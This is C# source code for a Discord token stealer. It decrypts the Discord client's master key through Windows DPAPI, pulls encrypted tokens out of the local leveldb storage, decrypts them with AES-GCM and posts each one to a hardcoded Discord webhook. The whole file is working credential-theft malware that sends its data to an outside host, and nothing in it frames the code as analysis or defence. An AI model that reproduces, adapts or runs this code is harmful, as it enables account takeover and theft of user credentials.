using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Modules
{
    public class DiscordStealer
    {
        public byte[]? GetMasterKey(string bPath)
        {
            string localStatePath = $"{bPath}\\Local State";
            string text = File.ReadAllText(localStatePath);
            dynamic? JSONed = JsonConvert.DeserializeObject(text);
            string? Key = JSONed?.os_crypt.encrypted_key;

            byte[] mkey = Convert.FromBase64String(Key);

            byte[] decryptedMasterKey = ProtectedData.Unprotect(
                mkey[5..],
                null,
                DataProtectionScope.CurrentUser
            );

            return decryptedMasterKey;
        }

        public List<string>? GetTokens()
        {
            List<string>? tokens = new();
            Console.WriteLine("[+] Executing...");

            string tokenStart = "dQw4w9WgXcQ:";

            string rexToken = "dQw4w9WgXcQ:[^\"]*";
            string? appdata = Environment.GetEnvironmentVariable("appdata");

            Console.WriteLine($"[~] Appdata : {appdata}");

            string discordPath = $"{appdata}\\discord";
            string lvlDbPath = $"{discordPath}\\Local Storage\\leveldb\\";

            if (Directory.Exists(lvlDbPath) != true)
            {
                Console.WriteLine("[+] Target Appears to not have discord..");
                return null;
            }
            Console.WriteLine("[+] Target has discord installed. Running Stealer..");
            byte[]? MasterKey = GetMasterKey(discordPath);

            Console.WriteLine($"MASTERKEY : {Encoding.ASCII.GetString(MasterKey)}");

            string[] dbFiles = Directory.GetFiles(lvlDbPath);

            foreach (string filePath in dbFiles)
            {
                try
                {
                    string fileExtension = filePath[^3..].ToLower();

                    if (fileExtension != "ldb" && fileExtension != "log")
                    {
                        continue;
                    }

                    string[] fileContentLines = File.ReadAllText(filePath).Split("\n");

                    foreach (string line in fileContentLines)
                    {
                        string stripedLine = line.Replace(" ", "").Trim();

                        MatchCollection Matches = Regex.Matches(stripedLine, rexToken);

                        foreach (Match validMatch in Matches)
                        {
                            string Match = validMatch.Value;
                            string EncToken = Match[tokenStart.Length..];
                            byte[] byteToken = Convert.FromBase64String(EncToken);
                            string DecodedToken = Encoding.ASCII.GetString(byteToken);
                            GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                            AeadParameters parameters = new AeadParameters(
                                new KeyParameter(MasterKey),
                                128,
                                byteToken[3..15],
                                null
                            );
                            byte[] plainBytes = new byte[
                                cipher.GetOutputSize(byteToken[15..].Length)
                            ];
                            cipher.Init(false, parameters);
                            cipher.ProcessBytes(
                                byteToken[15..],
                                0,
                                byteToken[15..].Length,
                                plainBytes,
                                0
                            );

                            SendToWebhook(Encoding.ASCII.GetString(plainBytes));

                            tokens.Add(Encoding.ASCII.GetString(plainBytes));
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Exception Occurred! [ {e.Data} ]");
                }
            }

            return tokens;
        }

        void SendToWebhook(string token)
        {
            using (var client = new HttpClient())
            {
                var content = new StringContent(
                    $"{{\"content\": \"DECRYPTED TOKEN : {token}\"}}",
                    Encoding.UTF8,
                    "application/json"
                );
                var result = client.PostAsync(webhookUrl, content).Result;
                Console.WriteLine($"[+] Sent token to webhook with result: {result.StatusCode}");
            }
        }

        static string webhookUrl =
            "https://discord.com/api/webhooks/1178191250344640522/hw4Dq1zgflfrZaJ4DOkeKgNrDH1tvgO2F0YPS0jy6vE0OovWlkfThB39zD-g-AqTMLYa";

        static void Main()
        {
            var stealer = new DiscordStealer();
            var tokens = stealer.GetTokens();

            // Process tokens as needed...
        }
    }
}
